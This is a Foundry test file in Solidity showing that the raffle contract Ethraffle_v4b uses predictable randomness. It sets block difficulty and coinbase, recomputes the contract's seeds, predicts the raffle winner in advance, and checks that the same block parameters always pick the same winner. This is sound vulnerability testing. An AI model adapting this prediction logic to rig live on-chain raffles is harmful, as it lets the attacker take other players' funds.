pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Ethraffle_v4b} from "../src/Ethraffle_v4b.sol";

contract TestWeakRandomnessEthraffle_v4b is Test {

    Ethraffle_v4b public raffle;
    
    uint256 public constant TOTAL_TICKETS = 50;
    uint256 public constant PRICE_PER_TICKET = (2.5 ether + 0.03 ether) / 50;

    event RaffleResult(
        uint raffleId,
        uint winningNumber,
        address winningAddress,
        address seed1,
        address seed2,
        uint seed3,
        bytes32 randHash
    );

    function setUp() public {
        raffle = new Ethraffle_v4b();
    }

    function test_highlightPredictableRandomValue(uint256 blockPrevrandao, address blockCoinbase) public {
        
        // Constrain symbolic variables to avoid edge cases
        vm.assume(blockCoinbase != address(0));
        vm.assume(blockPrevrandao > 0 && blockPrevrandao < type(uint128).max);
        
        // Fund this contract to buy tickets
        vm.deal(address(this), 100 ether);
        
        // Manipulate block environment
        vm.difficulty(blockPrevrandao);
        vm.coinbase(blockCoinbase);

        // Create multiple buyers to fill the raffle
        address[] memory buyers = new address[](TOTAL_TICKETS);
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            buyers[i] = address(uint160(i + 1));
            vm.deal(buyers[i], 1 ether);
        }

        // Buy 49 tickets from different addresses to set up contestants
        for (uint256 i = 0; i < TOTAL_TICKETS - 1; i++) {
            vm.prank(buyers[i]);
            raffle.buyTickets{value: PRICE_PER_TICKET}();
        }

        // Before buying the last ticket, predict the winner
        // The last buyer will be buyers[49]
        address lastBuyer = buyers[TOTAL_TICKETS - 1];
        
        // Predict seed1: contestants[uint(uint160(block.coinbase)) % totalTickets].addr
        uint256 seed1Index = uint256(uint160(blockCoinbase)) % TOTAL_TICKETS;
        address predictedSeed1;
        if (seed1Index < TOTAL_TICKETS - 1) {
            predictedSeed1 = buyers[seed1Index];
        } else {
            predictedSeed1 = lastBuyer;
        }
        
        // Predict seed2: contestants[uint(uint160(msg.sender)) % totalTickets].addr
        uint256 seed2Index = uint256(uint160(lastBuyer)) % TOTAL_TICKETS;
        address predictedSeed2;
        if (seed2Index < TOTAL_TICKETS - 1) {
            predictedSeed2 = buyers[seed2Index];
        } else {
            predictedSeed2 = lastBuyer;
        }
        
        // Predict seed3: block.difficulty (which we set via vm.difficulty)
        uint256 predictedSeed3 = blockPrevrandao;
        
        // Calculate predicted random hash
        bytes32 predictedRandHash = keccak256(abi.encodePacked(predictedSeed1, predictedSeed2, predictedSeed3));
        
        // Calculate predicted winning number
        uint256 predictedWinningNumber = uint256(predictedRandHash) % TOTAL_TICKETS;
        
        // Predict winning address
        address predictedWinningAddress;
        if (predictedWinningNumber < TOTAL_TICKETS - 1) {
            predictedWinningAddress = buyers[predictedWinningNumber];
        } else {
            predictedWinningAddress = lastBuyer;
        }

        // Record the winner's balance before
        uint256 winnerBalanceBefore = predictedWinningAddress.balance;

        // Execute: Buy the last ticket which triggers chooseWinner
        vm.prank(lastBuyer);
        raffle.buyTickets{value: PRICE_PER_TICKET}();

        // Assert predictability: The predicted winner should have received the prize
        uint256 winnerBalanceAfter = predictedWinningAddress.balance;
        
        // The winner should have received 2.5 ether prize
        // Account for the ticket cost if the winner was the last buyer
        if (predictedWinningAddress == lastBuyer) {
            // Last buyer paid PRICE_PER_TICKET and received 2.5 ether prize
            assertEq(
                winnerBalanceAfter,
                winnerBalanceBefore - PRICE_PER_TICKET + 2.5 ether,
                "Predicted winner did not receive expected prize (last buyer case)"
            );
        } else {
            // Other buyers already paid, just received prize
            assertEq(
                winnerBalanceAfter,
                winnerBalanceBefore + 2.5 ether,
                "Predicted winner did not receive expected prize"
            );
        }

        // Additional assertion: raffleId should have incremented
        assertEq(raffle.raffleId(), 2, "Raffle should have completed and incremented raffleId");
    }

    function test_sameBlockSameResult() public {
        // This test demonstrates that within the same block context,
        // the random outcome is completely deterministic
        
        vm.deal(address(this), 100 ether);
        
        // Set specific block parameters
        vm.difficulty(12345);
        vm.coinbase(address(0xCAFE));
        
        // Create snapshot before any purchases
        uint256 snapshot = vm.snapshot();
        
        // Run raffle once
        address[] memory buyers1 = new address[](TOTAL_TICKETS);
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            buyers1[i] = address(uint160(i + 100));
            vm.deal(buyers1[i], 1 ether);
            vm.prank(buyers1[i]);
            raffle.buyTickets{value: PRICE_PER_TICKET}();
        }
        
        // Record first raffle result by checking balances
        uint256[] memory balances1 = new uint256[](TOTAL_TICKETS);
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            balances1[i] = buyers1[i].balance;
        }
        
        // Find winner from first run
        address winner1;
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            if (balances1[i] > 1 ether - PRICE_PER_TICKET + 0.1 ether) {
                winner1 = buyers1[i];
                break;
            }
        }
        
        // Revert to snapshot
        vm.revertTo(snapshot);
        
        // Redeploy contract (state was reverted)
        raffle = new Ethraffle_v4b();
        
        // Run raffle again with same parameters
        address[] memory buyers2 = new address[](TOTAL_TICKETS);
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            buyers2[i] = address(uint160(i + 100));
            vm.deal(buyers2[i], 1 ether);
            vm.prank(buyers2[i]);
            raffle.buyTickets{value: PRICE_PER_TICKET}();
        }
        
        // Find winner from second run
        address winner2;
        for (uint256 i = 0; i < TOTAL_TICKETS; i++) {
            if (buyers2[i].balance > 1 ether - PRICE_PER_TICKET + 0.1 ether) {
                winner2 = buyers2[i];
                break;
            }
        }
        
        // Assert that both runs produced the same winner
        assertEq(winner1, winner2, "Same block parameters should produce same winner - randomness is predictable");
    }

    receive() external payable {}
}
